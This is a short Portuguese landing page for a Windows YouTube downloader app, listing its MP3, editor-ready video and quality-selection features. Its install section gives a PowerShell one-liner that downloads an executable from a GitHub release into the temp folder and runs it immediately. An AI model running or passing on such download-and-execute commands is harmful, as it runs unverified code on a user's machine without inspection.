v1.0.1 • Edição Windows

⚡ YouTube Downloader

Aplicativo desktop ultrapadrão para baixar vídeos e áudios com total compatibilidade para editores de vídeo.

🚀 Instalação Instantânea via Terminal

Copie e cole o comando abaixo no Prompt de Comando (CMD) ou PowerShell:

powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/JulyMount/Youtube-Downloader/releases/latest/download/YouTube-Downloader-Setup.exe' -OutFile '%TEMP%\yt-setup.exe'" && "%TEMP%\yt-setup.exe"
💾 Baixar Instalador (.exe)

🎵 MP3 em Alta Definição

Extração automática de áudio em 320kbps diretamente para a pasta Downloads.

🎬 Pronto para Editores

Conversão nativa em H.264 + AAC, sem erros no Adobe After Effects ou Premiere Pro.

⚙️ Seleção de Qualidade

Suporte a resoluções personalizadas (1080p, 720p, 480p) via menu avançado.
